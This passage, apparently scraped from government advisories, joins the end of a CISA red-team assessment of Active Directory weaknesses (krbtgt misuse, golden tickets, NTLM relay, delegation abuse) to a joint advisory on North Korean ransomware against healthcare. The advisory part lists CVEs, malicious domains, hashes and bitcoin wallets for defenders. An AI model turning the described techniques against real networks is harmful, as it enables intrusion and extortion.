KRBTGT never changed. The Site 1 krbtgt account password had not been updated for over a decade. The krbtgt account is a domain default account that acts as a service account for the key distribution center (KDC) service used to encrypt and sign all Kerberos tickets for the domain. Compromise of the krbtgt account could provide adversaries with the ability to sign their own TGTs, facilitating domain access years after the date of compromise. The red team was able to use the krbtgt account to forge TGTs for multiple accounts throughout Phase I.
Excessive permissions to standard users. The team discovered several standard user accounts that have local administrator access to critical servers. This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain.
Hosts with Unconstrained Delegation enabled unnecessarily. Hosts with Unconstrained Delegation enabled store the Kerberos TGTs of all users that authenticate to that host, enabling actors to steal service tickets or compromise krbtgt accounts and perform golden ticket or  “silver ticket” attacks. The team performed an NTLM-relay attack to obtain the DC’s TGT, followed by a golden ticket attack on a SharePoint server with Unconstrained Delegation to gain the ability to impersonate any Site 1 AD account.
Use of non-secure default configurations. The organization used default configurations for hosts with Windows Server 2012 R2. The default configuration allows unprivileged users to query group membership of local administrator groups. The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server.

Additional Issues
The team noted the following additional issues.

Ineffective separation of privileged accounts. Some workstations allowed unprivileged accounts to have local administrator access; for example, the red team discovered an ordinary user account in the local admin group for the SharePoint server. If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges. Administrative and user accounts should be separated, and designated admin accounts should be exclusively used for admin purposes.
Lack of server egress control. Most servers, including domain controllers, allowed unrestricted egress traffic to the internet.
Inconsistent host configuration. The team observed inconsistencies on servers and workstations within the domain, including inconsistent membership in the local administrator group among different servers or workstations. For example, some workstations had “Server Admins” or “Domain Admins” as local administrators, and other workstations had neither.
Potentially unwanted programs. The team noticed potentially unusual software, including music software, installed on both workstations and servers. These extraneous software installations indicate inconsistent host configuration (see above) and increase the attack surfaces for malicious actors to gain initial access or escalate privileges once in the network.
Mandatory password changes enabled. During the assessment, the team keylogged a user during a mandatory password change and noticed that only the final character of their password was modified. This is potentially due to domain passwords being required to be changed every 60 days.
Smart card use was inconsistent across the domain. While the technology was deployed, it was not applied uniformly, and there was a significant portion of users without smartcard protections enabled. The team used these unprotected accounts throughout their assessment to move laterally through the domain and gain persistence.

Noted Strengths
The red team noted the following technical controls or defensive measures that prevented or hampered offensive actions:

The organization conducts regular, proactive penetration tests and adversarial assessments and invests in hardening their network based on findings.

The team was unable to discover any easily exploitable services, ports, or web interfaces from more than three million external in-scope IPs. This forced the team to resort to phishing to gain initial access to the environment.
Service account passwords were strong. The team was unable to crack any of the hashes obtained from the 610 service accounts pulled. This is a critical strength because it slowed the team from moving around the network in the initial parts of the Phase I.
The team did not discover any useful credentials on open file shares or file servers. This slowed the progress of the team from moving around the network.


MFA was used for some SBSs. The team was blocked from moving to SBS 2 by an MFA prompt.
There were strong security controls and segmentation for SBS systems. Direct access to SBS were located in separate networks, and admins of SBS used workstations protected by local firewalls.

MITIGATIONS
CISA recommends organizations implement the recommendations in Table 2 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. See CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Additionally, CISA recommends organizations implement the mitigations below to improve their cybersecurity posture:

Provide users with regular training and exercises, specifically related to phishing emails,CPG 4.3,. Phishing accounts for majority of initial access intrusion events.
Enforce phishing-resistant MFA to the greatest extent possible,CPG 1.3,.
Reduce the risk of credential compromise via the following:

Place domain admin accounts in the protected users group to prevent caching of password hashes locally; this also forces Kerberos AES authentication as opposed to weaker RC4 or NTLM.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Refrain from storing plaintext credentials in scripts,CPG 3.4,. The red team discovered a PowerShell script containing plaintext credentials that allowed them to escalate to admin.


Upgrade to Windows Server 2019 or greater and Windows 10 or greater. These versions have security features not included in older operating systems.

As a long-term effort, CISA recommends organizations prioritize implementing a more modern, Zero Trust network architecture that:

Leverages secure cloud services for key enterprise security capabilities (e.g., identity and access management, endpoint detection and response, policy enforcement).
Upgrades applications and infrastructure to leverage modern identity management and network access practices.
Centralizes and streamlines access to cybersecurity data to drive analytics for identifying and managing cybersecurity risks.
Invests in technology and personnel to achieve these goals.

CISA encourages organizational IT leadership to ask their executive leadership the question: Can the organization accept the business risk of NOT implementing critical security controls such as MFA? Risks of that nature should typically be acknowledged and prioritized at the most senior levels of an organization.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES
See CISA’s RedEye tool on CISA’s GitHub page. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s RedEye tool overview video for more information.
REFERENCES,1, Bleeping Computer: New DFSCoerce NTLM Relay attack allows Windows domain takeover
APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES
See the tables below for all referenced red team tactics and techniques in this advisory. Note: Activity was from Phase I unless noted.


















This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-059a
34,"



SUMMARY
Note: This Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and various ransomware threat actors. These #StopRansomware advisories detail historically and recently observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn about other ransomware threats and no-cost resources.
The United States National Security Agency (NSA), the U.S. Federal Bureau of Investigation (FBI), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Department of Health and Human Services (HHS), the Republic of Korea (ROK) National Intelligence Service (NIS), and the ROK Defense Security Agency (DSA) (hereafter referred to as the “authoring agencies”) are issuing this joint Cybersecurity Advisory (CSA) to highlight ongoing ransomware activity against Healthcare and Public Health Sector organizations and other critical infrastructure sector entities.
This CSA provides an overview of Democratic People’s Republic of Korea (DPRK) state-sponsored ransomware and updates the July 6, 2022, joint CSA North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector. This advisory highlights TTPs and IOCs DPRK cyber actors used to gain access to and conduct ransomware attacks against Healthcare and Public Health (HPH) Sector organizations and other critical infrastructure sector entities, as well as DPRK cyber actors’ use of cryptocurrency to demand ransoms.
The authoring agencies assess that an unspecified amount of revenue from these cryptocurrency operations supports DPRK national-level priorities and objectives, including cyber operations targeting the United States and South Korea governments—specific targets include Department of Defense Information Networks and Defense Industrial Base member networks. The IOCs in this product should be useful to sectors previously targeted by DPRK cyber operations (e.g., U.S. government, Department of Defense, and Defense Industrial Base). The authoring agencies highly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks.
For additional information on state-sponsored DPRK malicious cyber activity, see CISA’s North Korea Cyber Threat Overview and Advisories webpage.
Download the PDF version of this report: pdf, 661 kb.
For a downloadable copy of IOCs, see


AA23-040A STIX XML
(XML,       196.24 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 12. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.
This CSA is supplementary to previous reports on malicious cyber actor activities involving DPRK ransomware campaigns—namely Maui and H0lyGh0st ransomware. The authoring agencies are issuing this advisory to highlight additional observed TTPs DPRK cyber actors are using to conduct ransomware attacks targeting South Korean and U.S. healthcare systems.
Observable TTPs
The TTPs associated with DPRK ransomware attacks include those traditionally observed in ransomware operations. Additionally, these TTPs span phases from acquiring and purchasing infrastructure to concealing DPRK affiliation:

Acquire Infrastructure [T1583]. DPRK actors generate domains, personas, and accounts; and identify cryptocurrency services to conduct their ransomware operations. Actors procure infrastructure, IP addresses, and domains with cryptocurrency generated through illicit cybercrime, such as ransomware and cryptocurrency theft.
Obfuscate Identity. DPRK actors purposely obfuscate their involvement by operating with or under third-party foreign affiliate identities and use third-party foreign intermediaries to receive ransom payments.
Purchase VPNs and VPSs [T1583.003]. DPRK cyber actors will also use virtual private networks (VPNs) and virtual private servers (VPSs) or third-country IP addresses to appear to be from innocuous locations instead of from DPRK.
Gain Access [TA0001]. Actors use various exploits of common vulnerabilities and exposures (CVE) to gain access and escalate privileges on networks. Recently observed CVEs that actors used to gain access include remote code execution in the Apache Log4j software library (known as Log4Shell) and remote code execution in unpatched SonicWall SMA 100 appliances [T1190 and T1133]. Observed CVEs used include:
CVE 2021-44228
CVE-2021-20038
CVE-2022-24990

Actors also likely spread malicious code through Trojanized files for “X-Popup,” an open source messenger commonly used by employees of small and medium hospitals in South Korea [T1195].
The actors spread malware by leveraging two domains: xpopup.pe[.]kr and xpopup.com. xpopup.pe[.]kr is registered to IP address 115.68.95[.]128 and xpopup[.]com is registered to IP address 119.205.197[.]111. Related file names and hashes are listed in table 1.

Table 1: Malicious file names and hashes spread by xpopup domains


File Name
MD5 Hash




xpopup.rar
1f239db751ce9a374eb9f908c74a31c9


X-PopUp.exe
6fb13b1b4b42bac05a2ba629f04e3d03


X-PopUp.exe
cf8ba073db7f4023af2b13dd75565f3d


xpopup.exe
4e71d52fc39f89204a734b19db1330d3


x-PopUp.exe
43d4994635f72852f719abb604c4a8a1


xpopup.exe
5ae71e8440bf33b46554ce7a7f3de666




Move Laterally and Discovery [TA0007, TA0008]. After initial access, DPRK cyber actors use staged payloads with customized malware to perform reconnaissance activities, upload and download additional files and executables, and execute shell commands [T1083, T1021]. The staged malware is also responsible for collecting victim information and sending it to the remote host controlled by the actors [TA0010].
Employ Various Ransomware Tools [TA0040]. Actors have used privately developed ransomware, such as Maui and H0lyGh0st [T1486]. Actors have also been observed using or possessing publically available tools for encryption, such as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0, My Little Ransomware, NxRansomware, Ryuk, and YourRansom [T1486]. In some cases, DPRK actors have portrayed themselves as other ransomware groups, such as the REvil ransomware group. For IOCs associated with Maui and H0lyGh0st ransomware usage, please see Appendix B.
Demand Ransom in Cryptocurrency. DPRK cyber actors have been observed setting ransoms in bitcoin [T1486].
Actors are known to communicate with victims via Proton Mail email accounts. For private companies in the healthcare sector, actors may threaten to expose a company’s proprietary data to competitors if ransoms are not paid. Bitcoin wallet addresses possibly used by DPRK cyber actors include:

1MTHBCrBKYEthfa16zo9kabt4f9jMJz8Rm
bc1q80vc4yjgg6umedkut3e9mhehxl4q4dcjjyzh59
1J8spy62o7z2AjQxoUpiCGnBh5cRWKVWJC
16ENLdHbnmDcEV8iqN4vuyZHa7sSdYRh76
bc1q3wzxvu8yhs8h7mlkmf7277wyklkah9k4sm9anu
bc1q8xyt4jxhw7mgqpwd6qfdjyxgvjeuz57jxrvgk9
1NqihEqYaQaWiZkPVdSMiTbt7dTy1LMxgX
bc1qxrpevck3pq1yzrx2pq2rkvkvy0jnm56nzjv6pw
14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk
1KCwfCUgnSy3pzNX7U1i5NwFzRtth4bRBc
16sYqXancDDiijcuruZecCkdBDwDf4vSEC
1N6JphHFaYmYaokS5xH31Z67bvk4ykd9CP
LZ1VNJfn6mWjPzkCyoBvqWaBZYXAwn135
1KmWW6LgdgykBBrSXrFu9kdoHz95Fe9kQF
1FX4W9rrG4F3Uc7gJ18GCwGab8XuW8Ajy2
bc1qlqgu2l2kms5338zuc95kxavctzyy0v705tpvyc
bc1qy6su7vrh7ts5ng2628escmhr98msmzg62ez2sp
bc1q8t69gpxsezdcr8w6tfzp3jeptq4tcp2g9d0mwy
bc1q9h7yj79sqm4t536q0fdn7n4y2atsvvl22m28ep
bc1qj6y72rk039mqpgtcy7mwjd3eum6cx6027ndgmd
bc1qcp557vltuu3qc6pk3ld0ayagrxuf2thp3pjzpe
bc1ql8wsflrjf9zlusauynzjm83mupq6c9jz9vnqxg
bc1qx60ec3nfd5yhsyyxkzkpts54w970yxj84zrdck
bc1qunqnjdlvqkjuhtclfp8kzkjpvdz9qnk898xczp
bc1q6024d73h48fnhwswhwt3hqz2lzw6x99q0nulm4
bc1qwdvexlyvg3mqvqw7g6l09qup0qew80wjj9jh7x
bc1qavrtge4p7dmcrnvhlvuhaarx8rek76wxyk7dgg
bc1qagaayd57vr25dlqgk7f00nhz9qepqgnlnt4upu
bc1quvnaxnpqlzq3mdhfddh35j7e7ufxh3gpc56hca
bc1qu0pvfmtxawm8s99lcjvxapungtsmkvwyvak6cs
bc1qg3zlxxhhcvt6hkuhmqml8y9pas76cajcu9ltdl
bc1qn7a3g23nzpuytchyyteyhkcse84cnylznl3j32
bc1qhfmqstxp3yp9muvuz29wk77vjtdyrkff4nrxpu
bc1qnh8scrvuqvlzmzgw7eesyrmtes9c5m78duetf3
bc1q7qry3lsrphmnw3exs7tkwzpvzjcxs942aq8n0y
bc1qcmlcxfsy0zlqhh72jvvc4rh7hvwhx6scp27na0
bc1q498fn0gauj2kkjsg35mlwk2cnxhaqlj7hkh8xy
bc1qnz4udqkumjghnm2a3zt0w3ep8fwdcyv3krr3jq
bc1qk0saaw7p0wrwla6u7tfjlxrutlgrwnudzx9tyw
bc1qyue2pgjk09ps7qvfs559k8kee3jkcw4p4vdp57
bc1q6qfkt06xmrpclht3acmq00p7zyy0ejydu89zwv
bc1qmge6a7sp659exnx78zhm9zgrw88n6un0rl9trs
bc1qcywkd7zqlwmjy36c46dpf8cq6ts6wgkjx0u7cn



MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the U.S. National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. For more information on the CPGs, including additional recommended baseline protections, see cisa.gov/cpg.
The authoring agencies urge HPH organizations to:

Limit access to data by authenticating and encrypting connections (e.g., using public key infrastructure certificates in virtual private network (VPN) and transport layer security (TLS) connections) with network services, Internet of Things (IoT) medical devices, and the electronic health record system [CPG 3.3].
Implement the principle of least privilege by using standard user accounts on internal systems instead of administrative accounts [CPG 1.5], which grant excessive system administration privileges.
Turn off weak or unnecessary network device management interfaces, such as Telnet, SSH, Winbox, and HTTP for wide area networks (WANs) and secure with strong passwords and encryption when enabled.
Protect stored data by masking the permanent account number (PAN) when displayed and rendering it unreadable when stored—through cryptography, for example.
Secure the collection, storage, and processing practices for personally identifiable information (PII)/protected health information (PHI), per regulations such as the Health Insurance Portability and Accountability Act of 1996 (HIPAA). Implementing HIPAA security measures could prevent the introduction of malware to the system [CPG 3.4].

Secure PII/ PHI at collection points and encrypt the data at rest and in transit using technologies, such as TLS. Only store personal patient data on internal systems that are protected by firewalls, and ensure extensive backups are available.
Create and regularly review internal policies that regulate the collection, storage, access, and monitoring of PII/PHI.


Implement and enforce multi-layer network segmentation with the most critical communications and data resting on the most secure and reliable layer [CPG 8.1].
Use monitoring tools to observe whether IoT devices are behaving erratically due to a compromise [CPG 3.1].

In addition, the authoring agencies urge all organizations, including HPH Sector organizations, to apply the following recommendations to prepare for and mitigate ransomware incidents:

Maintain isolated backups of data, and regularly test backup and restoration [CPG 7.3]. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware incident and protect against data losses.

Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.


Create, maintain, and exercise a basic cyber incident response plan and associated communications plan that includes response procedures for a ransomware incident [CPG 7.1, 7.2].

Organizations should also ensure their incident response and communications plans include data breach incidents response and notification procedures. Ensure the notification procedures adhere to applicable laws.
See the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide and CISA Fact Sheet Protecting Sensitive and Personal Information from Ransomware-Caused Data Breaches for information on creating a ransomware response checklist and planning and responding to ransomware-caused data breaches.


Install updates for operating systems, software, and firmware as soon as they are released [CPG 5.1]. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Regularly check for software updates and end-of-life notifications and prioritize patching known exploited vulnerabilities. Consider leveraging a centralized patch management system to automate and expedite the process.
If you use Remote Desktop Protocol (RDP), or other potentially risky services, secure and monitor them closely [CPG 5.4].

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources, and require phishing-resistant multifactor authentication (MFA) to mitigate credential theft and reuse [CPG 1.3]. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports [CPG 1.1, 3.1].
Ensure devices are properly configured and that security features are enabled. Disable ports and protocols not in use for a business purpose (e.g., RDP Transmission Control Protocol port 3389).
Restrict the Server Message Block (SMB) protocol within the network to only access necessary servers and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity [CPG 5.6, 6.2].
Implement application control policies that only allow systems to execute known and permitted programs [CPG 2.1].
Open document readers in protected viewing modes to help prevent active content from running.


Implement a user training program and phishing exercises [CPG 4.3] to raise awareness among users about the risks of visiting websites, clicking on links, and opening attachments. Reinforce the appropriate user response to phishing and spearphishing emails.
Require phishing-resistant MFA for as many services as possible [CPG 1.3]—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.
Use strong passwords [CPG 1.4] and avoid reusing passwords for multiple accounts. See CISA Tip Choosing and Protecting Passwords and National Institute of Standards and Technology (NIST) Special Publication 800-63B: Digital Identity Guidelines for more information.
Require administrator credentials to install software [CPG 1.5].
Audit user accounts with administrative or elevated privileges [CPG 1.5] and configure access controls with least privilege in mind.
Install and regularly update antivirus and antimalware software on all hosts.
Only use secure networks. Consider installing and using a VPN.
Consider adding an email banner to messages coming from outside your organizations [CPG 8.3] indicating that they are higher risk messages.
Consider participating in CISA’s no-cost Automated Indicator Sharing (AIS) program to receive real-time exchange of machine-readable cyber threat indicators and defensive measures.

If a ransomware incident occurs at your organization:

Follow your organization’s ransomware response checklist.
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
U.S. organizations: Follow the notification requirements as outlined in your cyber incident response plan. Report incidents to appropriate authorities; in the U.S., this would include the FBI at a local FBI Field Office, CISA at cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.
South Korean organizations: Please report incidents to NIS, KISA (Korea Internet & Security Agency), and KNPA (Korean National Police Agency).

NIS (National Intelligence Service)

Telephone : 111
https://www.nis.go.kr


KISA (Korea Internet & Security Agency)

Telephone : 118 (Consult Service)
https://www.boho.or.kr/consult/ransomware.do


KNPA (Korean National Police Agency)

Electronic Cybercrime Report & Management System: https://ecrm.police.go.kr/minwon/main




Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

RESOURCES
Stairwell provided a YARA rule to identify Maui ransomware, and a Proof of Concept public RSA key extractor at the following link:https://www.stairwell.com/news/threat-research-report-maui-ransomware/
REQUEST FOR INFORMATION
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, bitcoin wallet information, the decryptor file, and/or benign samples of encrypted files. As stated above, the authoring agencies discourage paying ransoms. Payment does not guarantee files will be recovered and may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. However, the agencies understand that when victims are faced with an inability to function, all options are evaluated to protect shareholders, employees, and customers.
Regardless of whether you or your organization decide to pay a ransom, the authoring agencies urge you to promptly report ransomware incidents using the contact information above.
ACKNOWLEDGEMENTS
NSA, FBI, CISA, and HHS would like to thank ROK NIS and DSA for their contributions to this CSA.
Disclaimer of endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Trademark recognition
Microsoft Threat Intelligence Center is a registered trademark of Microsoft Corporation. Apache®, Sonicwall, and Apache Log4j are trademarks of Apache Software Foundation. TerraMaster Operating System is a registered trademark of Octagon Systems.
Purpose
This document was developed in furtherance of the authors’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Appendix A: CVE Details



CVE-2021-44228     CVSS 3.0: 10 (Critical)




Vulnerability DescriptionApache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.


Recommended MitigationsApply patches provided by vendor and perform required system updates.


Detection MethodsSee vendors’ Guidance For Preventing, Detecting, and Hunting for Exploitation of the Log4j 2 Vulnerability.


Vulnerable Technologies and VersionsThere are numerous vulnerable technologies and versions associated with CVE-2021-44228. For a full list, please check https://nvd.nist.gov/vuln/detail/CVE-2021-44228.


See https://nvd.nist.gov/vuln/detail/CVE-2021-44228 for more information.






CVE-2021-20038     CVSS 3.0: 9.8 (Critical)




Vulnerability DescriptionA Stack-based buffer overflow vulnerability in SMA100 Apache httpd server's mod_cgi module environment variables allows a remote unauthenticated attacker to potentially execute code as a 'nobody' user in the appliance. This vulnerability affected SMA 200, 210, 400, 410 and 500v appliances firmware 10.2.0.8-37sv, 10.2.1.1-19sv, 10.2.1.2-24sv and earlier versions.



Recommended MitigationsApply all appropriate vendor updatesUpgrade to:

SMA 100 Series - (SMA 200, 210, 400, 410, 500v (ESX, Hyper-V, KVM, AWS, Azure):
SonicWall SMA100 build versions 10.2.0.9-41sv or later
SonicWall SMA100 build versions 10.2.1.3-27sv or later

System administrators should refer to the SonicWall Security Advisories in the reference section to determine affected applications/systems and appropriate fix actions.
Support for 9.0.0 firmware ended on 10/31/2021. Customers still using that firmware are requested to upgrade to the latest 10.2.x versions.



Vulnerable Technologies and VersionsSonicwall Sma 200 Firmware 10.2.0.8-37SvSonicwall Sma 200 Firmware 10.2.1.1-19SvSonicwall Sma 200 Firmware 10.2.1.2-24SvSonicwall Sma 210 Firmware 10.2.0.8-37SvSonicwall Sma 210 Firmware 10.2.1.1-19SvSonicwall Sma 210 Firmware 10.2.1.2-24SvSonicwall Sma 410 Firmware 10.2.0.8-37SvSonicwall Sma 410 Firmware 10.2.1.1-19SvSonicwall Sma 410 Firmware 10.2.1.2-24SvSonicwall Sma 400 Firmware 10.2.0.8-37SvSonicwall Sma 400 Firmware 10.2.1.1-19SvSonicwall Sma 400 Firmware 10.2.1.2-24SvSonicwall Sma 500V Firmware 10.2.0.8-37SvSonicwall Sma 500V Firmware 10.2.1.1-19SvSonicwall Sma 500V Firmware 10.2.1.2-24Sv


See https://nvd.nist.gov/vuln/detail/CVE-2021-20038 for more information.






CVE-2022-24990    CVSS 3.x: N/A




Vulnerability DescriptionThe TerraMaster OS Unauthenticated Remote Command Execution via PHP Object Instantiation Vulnerability is characterized by scanning activity targeting a flaw in the script enabling a remote adversary to execute commands on the target endpoint. The vulnerability is created by improper input validation of the webNasIPS component in the api.php script and resides on the TNAS device appliances' operating system where users manage storage, backup data, and configure applications. By exploiting the script flaw a remote unauthenticated attacker can pass specially crafted data to the application and execute arbitrary commands on the target system. This may result in complete compromise of the target system, including the exfiltration of information. TNAS devices can be chained to acquire unauthenticated remote code execution with highest privileges.


Recommended MitigationsInstall relevant vendor patches. This vulnerability was patched in TOS version 4.2.30


Vulnerable Technologies and VersionsTOS v 4.2.29


See https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/ and https://forum.terra-master.com/en/viewtopic.php?t=3030 for more information.



Appendix B: Indicators of Compromise (IOCs)
The IOC section includes hashes and IP addresses for the Maui and H0lyGh0st ransomware variants—as well as custom malware implants assumedly developed by DPRK cyber actors, such as remote access trojans (RATs), loaders, and other tools—that enable subsequent deployment of ransomware. For additional Maui IOCs, see joint CSA North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector.
Table 2 lists MD5 and SHA256 hashes associated with malware implants, RATs, and other tools used by DPRK cyber actors, including tools that drop Maui ransomware files.

Table 2: File names and hashes of malicious implants, RATs, and tools


MD5Hash
SHA256Hash




079b4588eaa99a1e802adf5e0b26d8aa
f67ee77d6129bd1bcd5d856c0fc5314169b946d32b8abaa4e680bb98130b38e7


0e9e256d8173854a7bc26982b1dde783
--


12c15a477e1a96120c09a860c9d479b3
6263e421e397db821669420489d2d3084f408671524fd4e1e23165a16dda2225


131fc4375971af391b459de33f81c253
--


17c46ed7b80c2e4dbea6d0e88ea0827c
b9af4660da00c7fa975910d0a19fda072031c15fad1eef935a609842c51b7f7d


1875f6a68f70bee316c8a6eda9ebf8de
672ec8899b8ee513dbfc4590440a61023846ddc2ca94c88ae637144305c497e7


1a74c8d8b74ca2411c1d3d22373a6769
ba8f9e7afe5f78494c111971c39a89111ef9262bf23e8a764c6f65c818837a44


1f6d9f8fbdbbd4e6ed8cd73b9e95a928
4f089afa51fd0c1b2a39cc11cedb3a4a326111837a5408379384be6fe846e016


2d02f5499d35a8dffb4c8bc0b7fec5c2
830207029d83fd46a4a89cd623103ba2321b866428aa04360376e6a390063570


2e18350194e59bc6a2a3f6d59da11bd8
655aa64860f1655081489cf85b77f72a49de846a99dd122093db4018434b83ae


3bd22e0ac965ebb6a18bb71ba39e96dc
6b7f566889b80d1dba4f92d5e2fb2f5ef24f57fcfd56bb594978dffe9edbb9eb


40f21743f9cb927b2c84ecdb7dfb14a6
5081f54761947bc9ce4aa2a259a0bd60b4ec03d32605f8e3635c4d4edaf48894


4118d9adce7350c3eedeb056a3335346
5b7ecf7e9d0715f1122baf4ce745c5fcd769dee48150616753fec4d6da16e99e


43e756d80225bdf1200bc34eef5adca8
afb2d4d88f59e528f0e388705113ae54b7b97db4f03a35ae43cc386a48f263a0


47791bf9e017e3001ddc68a7351ca2d6
863b707873f7d653911e46885e261380b410bb3bf6b158daefb47562e93cb657


505262547f8879249794fc31eea41fc6
f32f6b229913d68daad937cc72a57aa45291a9d623109ed48938815aa7b6005c


5130888a0ad3d64ad33c65de696d3fa2
c92c1f3e77a1876086ce530e87aa9c1f9cbc5e93c5e755b29cad10a2f3991435


58ad3103295afcc22bde8d81e77c282f
18b75949e03f8dcad513426f1f9f3ca209d779c24cd4e941d935633b1bec00cb


5be1e382cd9730fbe386b69bd8045ee7
5ad106e333de056eac78403b033b89c58b4c4bdda12e2f774625d47ccfd3d3ae


5c6f9c83426c6d33ff2d4e72c039b747
a3b7e88d998078cfd8cdf37fa5454c45f6cbd65f4595fb94b2e9c85fe767ad47


640e70b0230dc026eff922fb1e44c2ea
6319102bac226dfc117c3c9e620cd99c7eafbf3874832f2ce085850aa042f19c


67f4dad1a94ed8a47283c2c0c05a7594
3fe624c33790b409421f4fa2bb8abfd701df2231a959493c33187ed34bec0ae7


70652edadedbacfd30d33a826853467d
196fb1b6eff4e7a049cea323459cfd6c0e3900d8d69e1d80bffbaabd24c06eba


739812e2ae1327a94e441719b885bd19
6122c94cbfa11311bea7129ecd5aea6fae6c51d23228f7378b5f6b2398728f67


76c3d2092737d964dfd627f1ced0af80
bffe910904efd1f69544daa9b72f2a70fb29f73c51070bde4ea563de862ce4b1


802e7d6e80d7a60e17f9ffbd62fcbbeb
87bdb1de1dd6b0b75879d8b8aef80b562ec4fad365d7abbc629bcfc1d386afa6


827103a6b6185191fd5618b7e82da292
--


830bc975a04ab0f62bfedf27f7aca673
--


85995257ac07ae5a6b4a86758a2283d7
--


85f6e3e3f0bdd0c1b3084fc86ee59d19
f1576627e8130e6d5fde0dbe3dffcc8bc9eef1203d15fcf09cd877ced1ccc72a


87a6bda486554ab16c82bdfb12452e8b
980bb08ef3e8afcb8c0c1a879ec11c41b29fd30ac65436495e69de79c555b2be


891db50188a90ddacfaf7567d2d0355d
0837dd54268c373069fc5c1628c6e3d75eb99c3b3efc94c45b73e2cf9a6f3207


894de380a249e677be2acb8fbdfba2ef
--


8b395cc6ecdec0900facf6e93ec48fbb
--


92a6c017830cda80133bf97eb77d3292
d1aba3f95f11fc6e5fec7694d188919555b7ff097500e811ff4a5319f8f230be


9b0e7c460a80f740d455a7521f0eada1
45d8ac1ac692d6bb0fe776620371fca02b60cac8db23c4cc7ab5df262da42b78


